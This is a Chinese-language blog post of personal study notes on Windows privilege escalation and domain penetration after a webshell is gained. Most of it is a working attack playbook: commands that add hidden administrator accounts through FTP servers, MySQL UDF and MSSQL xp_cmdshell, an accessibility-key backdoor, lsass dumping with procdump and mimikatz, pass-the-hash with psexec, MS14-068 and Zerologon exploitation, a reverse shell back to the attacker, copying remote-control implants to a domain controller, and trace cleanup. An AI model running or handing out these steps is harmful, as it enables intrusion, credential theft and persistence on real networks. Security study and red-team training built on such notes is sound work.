---
layout:     post
title:      权限提升&内网渗透（一）Windows提权
subtitle:   这个系列是整理学习安全的笔记，记录一些学习到的提权和内网渗透的知识，还有一些相关工具的使用，脚本可能不会贴源码，因为都是从别人搜集的开源exp中拿过来用的，已知出处的会附加链接。本章是记录Windows提权，可能不全，只是前段时间蹭课学到记录下来的。
date:       2020-12-24
author:     K4ys0n
header-img: img/post-bg-art.jpg
catalog:    true
tags:
    - CTF
    - windows
    - 网络安全
    - 学习笔记
    - 权限提升
    - 漏洞利用
    - 域渗透
    - 内网渗透
---



## 0x00 什么是提权

主要针对网站测试过程中，当测试某一网站时，通过各种漏洞提升Webshell权限，以夺得服务器系统权限。



## 0x01 有用的知识点

#### 1. 通常脚本所处的权限

- asp/php    匿名权限
- aspx    user权限
- jsp    通常是系统权限

#### 2. 突破cmd受限

目标windows可能存在如下几种情况限制了cmd的调用执行：

- 防护软件拦截
- cmd被降权
- 组件被删除


突破的方法是：找可读写目录上传cmd.exe，将执行的cmd.exe路径替换成上传的路径，再次调用执行。

#### 3. windows靶机下载文件

首先在本地起一个HTTP服务，用python3示例：

```
python -m http.server 4444
```

假设本地的IP为192.168.1.115（靶机要访问得到），接着在靶机运行下面命令。

```powershell
certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt c:\a.txt          # 下载链接中的robots.txt文件保存到c盘a.txt文件中  
certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt delete            # 清理缓存
```

#### 4. ip绑定域名

- windows下

```
C:\Windows\System32\drivers\etc\hosts
```

记事本打开，在最后追加ip及对应域名即可。

- Linux下

```
/etc/hosts
```

vim打开，在最后追加ip及对应域名即可。



## 0x02 后渗透的一般流程和思路

拿到webshell后要做的事情：

- 服务器信息搜集（系统信息、端口扫描等）
- 提权（利用数据库漏洞、系统漏洞、第三方软件漏洞等）
- 提权后可以创建系统账户、开放远程桌面、关闭防火墙等进一步控制
- 内网信息搜集（IP段\&端口扫描、域信息搜集等）
- 找其他服务器及其开放的服务（windows最重要的是找到域控服务器）
- 控制并提权其他服务器（利用各种服务漏洞、系统漏洞或者站点漏洞等控制并提权）
- 需要时应做端口转发或者建立反向shell（绕过防火墙）
- 权限维持（可以用CS集中控制shell）



## 0x03 内网信息搜集

#### 1. 本地信息搜集

- 内外网
- 服务器系统和版本、位数
- 服务器的补丁情况
- 服务器的安装软件情况
- 服务器的防护软件情况
- 端口情况
- 支持脚本情况
- ......

```shell
ipconfig /all 	# 查看当前ip
net user 		# 查看当前服务器账号情况
netstat -ano 	# 查看当前服务器端口开放情况
ver 			# 查看当前服务器操作系统
systeminfo 		# 查看当前服务器配置信息（补丁情况）
wmic qfe get Caption,Description,HotFixID,InstalledOn		# 获取系统补丁信息
taskkill -PID [pid号] 		   # 结束某个pid号的进程
taskkill /im qq.exe /f 			# 结束QQ进程
net user abc 123 /add 			# 添加一个用户名为abc密码为123的用户
net localgroup administrators abc /add 		# 将用户abc添加到管理员组
whoami 			# 查看当前操作用户（当前权限）
hostname		# 查看当前计算机名称
query user		# 查看管理员是否在线
msg administrator who are you	# 发送信息“who are you”给管理员

# 获取防火墙有关信息(仅用于XP SP2及更高版本)：
netsh firewall show state
netsh firewall show config

# 获取所有计划任务的详细输出（需要先设置为美国编码437，默认是中文编码936）：
chcp 437
schtasks /query /fo LIST /v

# 获取主机名运行的进程：
tasklist /SVC
# 看杀软    360，主动防御、火绒(usysdiag.exe进程)
# 看其他软件提权     tomcat（权限高）、iis（权限低）、redius提权等
```

#### 2. 域内信息搜集

- 域
> 微软Active Directory
> - 微软的目录服务，又叫“活动目录”。
> - 用来存储网络上的用户和计算机信息的数据库提供几种的安全性配置，便捷的网络访问。
> - 包括服务器和用户计算机（Windows 2000/XP）。
> - 不同于传统的工作组模式，AD最大的优点是可以集中管理，包括统一身份认证、权限控制等，方便管理。

- 域配置
> - 设置域需要开88端口。
>
> - 域是通过域名访问的，所以域控需要安装DNS服务器（默认），以方便域名解析。
>
> - 域内主机的DNS的IP必须设置成域控的IP。
>
> - 右键计算机，属性，计算机名称、域和工作组设置处更改设置。
>
> - 域内主机创建账户是无效的，只能由域控创建。

- 域内主机相关命令
> - 获取域内主机成员
> ```shell
> net view
> net group "domain computers" /domain
> ```
> - 获取域内账户信息
>
> ```shell
> net user /domain
> ```
>
> 显示结果中如：\\\\AdServer.k4ys0n.com   
> 其中AdServer为域控主机名，k4ys0n.com为域名，还可能看到krbtgt账户，其相当于Administrator账户
>
> - ping测域内主机
>
> ```shell
> ping [主机名]
> ping K4YS0N-PC
> ```
>
> - 获取域控的信息
>
> ```shell
> ipconfig /all
> nslookup -type=all _ldap._tcp.dc._msdcs.rootkit.org
> ```
>
> - 获取域内spn主机信息（域信息、主机信息、服务信息）
>
> ```shell
> setspn -T target.com -Q */*
> ```
>
> 显示结果中，CN是域内主机名，DC是域名。

- AdFind工具查询域内信息
> - 查询域控
>
> ```shell
> adfind.exe -sc dclist
> ```
>
> - 查询域内在线主机和主机信息
>
> ```shell
> adfind.exe -sc computers_active name operatingSystem
> ```
>
> 需要显示什么字段直接后面加上即可，每台主机有一个唯一的SID。



## 0x04 windows常见提权方式

#### 1. 普通账户提权

- 第三方软件提权
- 溢出提权
- 启动项提权
- 破解hash提权
- 数据库提权

#### 2. 域内提权

- PTH
- ms14-068域内提权
- CVE-2020-1472
- kekeo 域内主机提权



## 0x05 第三方软件提权

#### 1. 常见第三方软件提权

- FTP软件：server-u、g6ftp、Filezilla

- 远程管理软件：PCanywhere、radmin、vnc

#### 2. server-u提权

- 有修改权限
	- 检查是否有可写权限 修改server-u默认安装目录下的ServUDaemon.ini
	- 增加用户，该用户拥有管理员权限
	- 连接新用户
	- 执行命令
	

增加新用户的命令如下：

```shell
quote site exec net user abc 123 /add
quote site exec net localgroup administrators abc /add
```

- 无修改权限

首先暴力破解md5，然后进行溢出提权。

#### 3. G6ftp提权

- 下载管理配置文件，将administrator管理密码破解。

- 使用lcx端口转发（默认只允许本机连接）。

```shell
lcx.exe -tran 8027 127.0.0.1 9999
```

- 使用客户端以管理员用户登录。

- 创建用户并设置权限和执行的批处理文件xxx.bat。

- 上传批处理，并命名批处理命令为xxx。

- 以创建的普通用户登录ftp。

- 执行命令。

```shell
......>ftp 192.168.1.100	# 这里在本地的命令行或终端ftp
......
User(...):abc		# 这里输入新建用户名
...
Password:		# 这里输入新建用户的密码
...logged in.
ftp> quote site xxx		# 这里执行批处理命令xxx即可
...command executed.
ftp>
```
xxx.bat内容为添加系统用户，如下：

```
net user abc 123 /add
net localgroup administrators abc /add
```

#### 4. Filezilla提权
- 简介

Filezilla是一款开源的FTP服务器和客户端的软件。

若安装了服务器端默认只监听127.0.0.1的14147端口，并且默认安装目录下有两个敏感文件filezillaserver.xml（包含了用户信息）和filezillaserver interface.xml（包含了管理信息）。

- 提权思路
	- 下载这两个文件，拿到管理密码。
	- 配置端口转发，登录远程管理ftpserver，创建ftp用户。
	- 分配权限，设置家目录为`C:\`。
	- 使用cmd.exe改名为sethc.exe替换`C:\windows\system32\sethc.exe`生成shift后门
	- 连接3389按5次shift调出cmd.exe

#### 5. pcanywhere提权
- 访问pcanywhere默认安装目录
- 下载用户配置文件
- 通过破解账户密码文件

#### 6. radmin提权
- 通过端口扫描，扫描4899端口
- 上传radmin.asp木马读取radmin的加密密文
- 使用工具连接（如一些大马，目前找到的大马没有，但看别人有）

#### 7. vnc提权
- 通过读取注册表十进制数
- 转换成十六进制数
- 破解十六进制数得到密码

```shell
vncx4.exe -W
```

- 逐个输入转换后的十六进制数（输一个十六进制数就回车），即可破解得到密码。
- 连接vnc

注：学习的时候我没找到这个工具，但是找了另一个可以替换用一下，**K8fuckVNC4.exe**。



## 0x06 溢出提权

#### 1. 简介

溢出提权主要是通过windows漏洞利用来获取系统权限。

#### 2. 常见的溢出提权

- 巴西烤肉
- pr

#### 3. 步骤

- 通过信息收集查看服务器打了哪些补丁
- 根据未打补丁漏洞进行利用即可（可以利用GetRoot Tools.exe查找漏洞）



## 0x07 启动项提权

#### 1.查看数据库中有哪些数据表

```mysql
show tables;
```

默认情况下，test数据库中没有任何表的存在。

#### 2.在TEST数据库下创建一个新的表

```mysql
create table a(cmd text);
```

创建了一个表名为a，表中只存放一个字段，字段名为cmd，类型时text文本。

#### 3.在表中插入内容

```mysql
insert into a values("set wshshell=createobject (""wscript.shell"")");
insert into a values("a=wshshell.run (""cmd.exe /c net user 1 1 /add"",0)");
insert into a values("b=wshshell.run(""cmd.exe /c net localgroup Administrators 1 /add"",0)");
```

注意双引号和括号以及后面的“0”一定要输入！这三条命令建立一个VBS脚本程序。

#### 4.查看表a

```mysql
select * from a;
```

表中有三行数据，就是前面输入的内容，确认输入无误后继续往下。

#### 5.输出表为一个VBS的脚本文件

```mysql
select * from a into outfile "C://Users//User//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//a.vbs";
```

#### 6.重启即可



## 0x08 破解hash提权

#### 1. 所需工具

- pwdump7.exe（windows Hash密码导出工具）

- LC5.exe（windows Hash密码破解工具）
- 彩虹表（哈希链集，用于破解hash）
- getpass.exe（windows Hash密码破解一条龙，但我在网上找到的都运行不了）

#### 2. 步骤

- 上传pwdump7.exe运行获取hash值
- 拿到LC5、彩虹表中破解即可得到管理员密码（需要管理员权限才能执行读取hash操作）



## 0x09 Mssql数据库提权
#### 1. 前提条件

需要具备数据库管理员权限才可执行提权操作。

sqlmap判断数据库是否为管理员权限的方法：用`--is-dba`参数，输出结果为true即管理员权限。

#### 2. 提权步骤

- **安装xp_cmd_shell**
```mssql
exec sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE
```

最后清理痕迹时可以删除组件：

```mssql
exec sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE
```

- **开启3389**
```mssql
exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;-- 
```

或者

```mssql
exec master..xp_cmdshell 'sc config termservice start=auto';
exec master..xp_cmdshell 'net start termservice';
exec master..xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x0 /f';        # 允许外部连接
```

最后清理痕迹时可以关闭3389：

```mssql
exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',1;
```

- **新建管理员用户并连接**

```mssql
exec master..xp_cmdshell 'net user abc 123 /add';exec master..xp_cmdshell 'net localgroup administrators abc /add';
```

创建新用户abc并添加到管理员组，远程连接管理员用户即可。

- **破解账户Administrator的密码**

>  方案一：
>
> 首先通过网站上传procdump.exe，可能需要各种上传绕过，如procdump.jpg。如果上传的是procdump.jpg，则需要在Mssql里执行下面代码。
>
> ```mssql
> exec master..xp_cmdshell 'copy procdump.jpg c:\procdump.exe';
> ```
>
> 然后执行procdump.exe，有三种方法，但前两种不推荐，会被火绒拦截。
>
> > 第一种是直接执行procdump.exe程序
> >
> > ```mssql
> > exec master..xp_cmdshell 'c:\procdump.exe -accepteula -ma lsass.exe lsass.dmp';
> > ```
>
> > 第二种是创建bat脚本执行（上传bat脚本，上传时可能因绕过需要而命名为jpg，所以这里需要先改回bat后缀）
> >
> > ```mssql
> > exec master..xp_cmdshell 'copy c:\wwwroot\upload\...\xxx.jpg c:\xxx.bat';
> > ```
> >
> > 其中上传的jpg（即bat文件）内容为
> >
> > ```shell
> > c:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
> > ```
> >
> > 执行bat脚本
> >
> > ```mssql
> > exec master..xp_cmdshell 'c:\xxx.bat';
> > ```
>
> > 第三种是计划任务执行
> >
> > 同上先创建bat，但是不直接执行bat（会被火绒拦截），
> >
> > ```mssql
> > exec master..xp_cmdshell 'at [time] c:\xxx.bat';
> > # 例如
> > exec master..xp_cmdshell 'at 15:01:01 c:\xxx.bat';
> > ```
> 
> 然后将上述产生的lsass.dmp文件复制到网站目录下，浏览器下载此文件。
> 
> ```mssql
> exec master..xp_cmdshell 'copy c:\lsass.dmp c:\wwwroot\upload\....\lsass.dmp';
> ```
>
>接下来利用PTH即可。

> 方案二：
>
> 直接在目标机器cmd下运行下面命令
>
> ```powershell
> reg save hklm\sam sam.hiv
> reg save hklm\system sys.hiv
> lsadump::sam /sam: sam.hiv /system:sys.hiv
> ```
>
> 就可以直接拿到本地账户 administrator的 NTLM hash了，然后用psexec.py等工具进行连接即可。

#### 3. sa账号的获取

可以通过查看config.asp、conn.asp等文件

如果是aspx，可能在web.config文件



## 0x0a MySQL数据库提权

#### 1. 前提条件

需要具备数据库管理员权限才可执行提权操作。

sqlmap判断数据库是否为管理员权限的方法：用`--is-dba`参数，输出结果为true即管理员权限。

#### 2. 提权方式

- udf提权
- mof提权
- 启动项提权（前面已经说到了）
- 反连端口提权

#### 3. udf提权

- udf提权原理

通过root权限导出udf.dll到系统目录下（或者直接上传），利用udf.dll调用执行cmd。

```
C:\Winnt\udf.dll    2000
C:\Windows\udf.dll    2003
```

现在基本上win的服务器就这两个导出udf.dll，5.1以上版本需要导出到MySQL安装目录`lib\plugin\`下。

- 具体步骤

第一步，getshell后蚁剑连接，然后数据库管理

> 如何获取到对方的MySQL数据库root账号密码
> 
> - 查看网站源码里面数据库配置文件（inc、conn、config、sql、common、data等）
> - 查看数据库安装路径下的user.myd（/data/mysql/）
> - 暴力破解：mysql密码破解，3306端口入侵

第二步，用下面sql语句查看系统版本、plugin目录

> ```mysql
> select @@version_compile_os, @@version_compile_machine;
> select @@plugin_dir;
> ```

第三步，利用sqlmap里未解码的.dll\_文件生成并上传udf.dll（Linux的udf为.so\_）

>  用sqlmap中的cloak.py解码对应版本的.dll\_文件为udf.dll，上传udf.dll到www目录下。
>
> 注：cloak.py文件所在目录：/usr/share/sqlmap/extra/cloak/cloak.py
>
>  .dll\_文件所在目录：/usr/share/sqlmap/data/udf/，根据版本进入相应目录查找。
>
> 根据找到的文件路径执行以下命令生成.dll文件：
> 
> ```shell
> python /usr/share/sqlmap/extra/cloak/cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.dll_ -o ./udf.dll
> ```

第四步，用数据库权限将udf.dll写入到MySQL的plugin目录下，这样才有系统权限

> ```mysql
> select load_file('c:\wwwroot\udf.dll') into dumpfile 'c:\...\mysql\plugin\udf.dll'
> ```
> 
> 这里用的plugin路径就是上面查出来的。

第五步，创建系统函数

> ```mysql
> create function cmdshell returns string soname 'udf.dll';
> # 删除函数
> drop function cmdshell;
> ```
> 
> 如果是Linux系统则创建system或sys_exec或sys_eval函数，哪个能成功用哪个就行
> 
> ```mysql
> create function sys_exec returns int soname 'udf.so';
> # 删除函数
> drop function sys_exec;
> ```

第六步，执行系统命令，如创建账户等

> ```mysql
> select cmdshell('net user abc 123 /add');
> select cmdshell('net localgroup administrators abc /add');
> ```
>
> 如果再Linux系统下，第一次执行需要加权限，之后都不需要。（这里导出到文件是因为前面创建时是返回int，没法回显其他信息，所以只能保存文件）
>
> ```mysql
> select sys_exec('ls -al >> /log && chmod 777 /log');
> select sys_exec('ls -al >> /log');
> ```

#### 4. mof提权

mof提权有一定的成功率，不一定百分百成功，得多试很多次。

- 方法一，上传大马进行提权

上传mof.php，输入相关信息，执行命令，提权。

- 方法二，上传mof文件，通过load_file执行文件复制到系统路径下进行提权

上传文件x.mof，使用select命令导出到正确位置：

```mysql
select load_file('C:/wmpub/nullevt.mof') into dumpfile 'C:/windows/system32/wbem/mof/nullevt.mof'
```


设置允许外部地址使用MySQL的root用户连接的SQL语句：

```mysql
Grant all privileges on *.* to 'root' @ '%' identified by 'root' with grant option;
```

#### 5. 反连端口提权
实际上也是需要借助udf提权，这种方法没有试过，先记录着以后需要用到再试试。

首先利用MySQL客户端工具连接MySQL服务器，提交udf提权脚本，然后执行下面的操作。

- 执行命令

```shell
mysql.exe -h 192.168.1.1 -uroot -p
Enter password:
mysql>\.c:\mysql.txt
mysql>select backshell("[自己的IP]",[自己的端口]);
```

- 本地监听反弹的端口

```shell
nc.exe -vv -l -p 4444
```

成功后将获得一个system权限的cmdshell。



## 0x0b PTH

在拿下一台主机的最高权限后，要拿下域内其他主机的系统账户，可以通过PTH的方法。

#### 1. NTLM和SMB

- SMB的认证是基于NTLM协议，NTLM协议使用了hash进行认证，在认证过程中，直接提供hash可以认证成功。因此我们通过工具直接发送hash，就可以利用smb来执行命令，这就是Pass The Hash。
- 需要开启445服务端口。
- 工具：wmiexec、psexec、psexec64、psexec.py（python版，需要安装扩展库impacket）

#### 2. 获取hash

在windows系统中一般都有这个进程：lsass.exe，win10以下，该文件有system权限，保存明文密码。

一般在Windows系统中，在获取最高权限后，我们用一些工具可以抓取到系统的账户。

常用工具：mimikatz、lazagne、Getpassword等。

- mimikatz.exe

> - 在交互式的shell中打开，命令行中输入：
>
> ```shell
> mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit        # 加不加双引号都可以
> ```
>
> 即可得到明文账户密码。
>
> - 界面方式打开
>
> 管理员方式打开mimikatz.exe
> 输入：log                用来保存
> 输入：privilege::debug                注入到lsass.exe进程
> 输入：sekurlsa::logonpasswords            即可破解密码，然后打开目录下的mimikatz.log文件查看明文账户密码
>
> - 有杀软时procdump下载然后mimikatz加载
>
> 当有360或火绒等杀软时，没法直接上传mimikatz到靶机中进行密码获取，这时可以把lsass.exe进程用procdump工具下载下来。
>
> 如何判断有无火绒？
>
> 进程中存在usysdiag.exe    即为火绒的进程。
>
> procdump命令
>
> ```shell
> procdump64.exe -accepteula -ma lsass.exe lsass.dmp
> ```
>
> 会产生lsass.dmp文件，下载后用mimikatz解读即可
>
> ```shell
> mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
> ```

- lazagne

> 抓取当前系统密码或hash，以及浏览器密码。

#### 3. 用工具登录域内主机的system权限账户

注：如果登录的是域控，则可以控制域内所有电脑。

- psexec
> ```shell
> psexec \\[域控ip或者域控主机名] -u Administrator -p [密码] cmd
> # 例如：
> psexec \\10.10.30.30 -u Administrator -p 123456 cmd
> 
> psexec \\AdServer -u Administrator -p 123456 cmd
> psexec administrator@[ip] -hashes [LMHASH]:[NTHASH] cmd
> ```
>
> 其中LM用0补全，NT用抓hash的工具——lazagne或mimikatz获取。
>
> 注意如果是域控的管理员，需要加上域名。

- psexec.py
> ```shell
> python psexec.py '[域控名]/administrator:[密码]@[域名或ip]' cmd
> python psexec.py -hashes 00000000000000000000000000000000:hashhashhashhashhashhashhashhash administrator:@[域名或ip] cmd
> python psexec.py 'adserver/administrator:123456@10.10.30.30' cmd
> ```

- wmiexec，功能差不多，但容易崩
> ```shell
> wmiexec administrator:[密码]@[ip] cmd
> wmiexec administrator@[ip] -hashes [LMHASH]:[NTHASH] cmd
> wmiexec -hashes 00000000000000000000000000000000:hashhashhashhashhashhashhashhash administrator@10.10.30.30 cmd
> ```
>
> 如果没有密码就用hash，密码置空。



## 0x0c ms14-068域内提权

#### 1. 相关工具

- lazagne（获取windows hash的工具）
- mimikatz（获取windows hash的工具）
- adfind（域内扫描工具）
- [ms14-068.exe](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068)（ms14-068漏洞利用工具）
- psexec.exe（域内提权工具）

#### 1. 获取当前域用户的sid

漏洞利用需要获取到一个普通的域账户，包括账户名，密码或者hash。

使用lazagne或者mimikatz可以抓取到域账户信息，需要将工具上传到目标主机上。

通过域账户执行命令 

```shell
C:\Users\User>whoami /user

用户信息
----------------

用户名              SID
=================== =============================================
k4ys0n\user S-x-x-xx-xxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx
```

可以获取到当前域账户的sid。

#### 2. 生成TGT票据

使用 adfind获取域控的主机名字。

使用mimikatz可以获取主机明文密码：

```shell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

使用以下命令攻击域内主机：

```shell
ms14-068.exe -u [用户名]@[域名] -p [密码] -s [sid] -d [域控主机名].[域名]
```

注意-d后面只能跟正确的域控主机名.域名，而不能用ip

```shell
ms14-068.exe -u temp@k4ys0n.com -p 123456 -s S-x-x-xx-xxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx -d AdServer.k4ys0n.com
```

执行完成会生成票据文件`TGT_temp@k4ys0n.com.ccache`

#### 3. 导入票据

可以先命令行输入以下命令来清空当前票据：

```shell
klist purge
```

使用mimikatz可以导入票据：

```shell
mimikatz.exe "kerberos::ptc TGT_temp@k4ys0n.com.ccache" exit
```

导入完成输入以下命令查看当前导入票据：

```shell
klist
```

#### 4. psexec提权为域控的administrator账户

```shell
psexec.exe \\AdServer.k4ys0n.com cmd
```

#### 5. 拷贝远控程序xxx.exe到根目录

```shell
copy ./xxx.exe \\AdServer.cleverbao.com\c$        # 拷贝到c盘
# 或者
copy ./xxx.exe \\AdServer.cleverbao.com\c$\users\    # 拷贝到c盘下的users目录
```

远控程序可以用cobaltstrike生成。



## 0x0d CVE-2020-1472

github上可以下载exp，也是域控提权

```shell
python exp.py k4ys0n.com 10.10.30.30
psexec.exe \\10.10.30.30 cmd
```

参考exp如：

- [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
- [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
- [https://github.com/risksense/zerologon](https://github.com/risksense/zerologon)



## 0x0e kekeo 域内主机提权

kekeo工具功能类似ms14-068.exe

下载链接：[https://github.com/gentilkiwi/kekeo](https://github.com/gentilkiwi/kekeo)

- 生成票据功能

```shell
kekeo.exe "exploit::ms14068 /user:[账户名] /password:[密码] /sid:[sid] /ptc" exit
# 例如：
kekeo.exe "exploit::ms14068 /user:temp /password:123456 /sid:S-x-x-xx-xxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx /ptc" exit
```

其他功能同ms14-068.exe。



## 0x0f 常见windows存在的漏洞端口

- 445 ms17-010 永恒之蓝（windows 10 以前）
- 3389 CVE-2019-0708 BlueKeep（windows7/windows2008）
- 445 ms08-067（windows2008以前）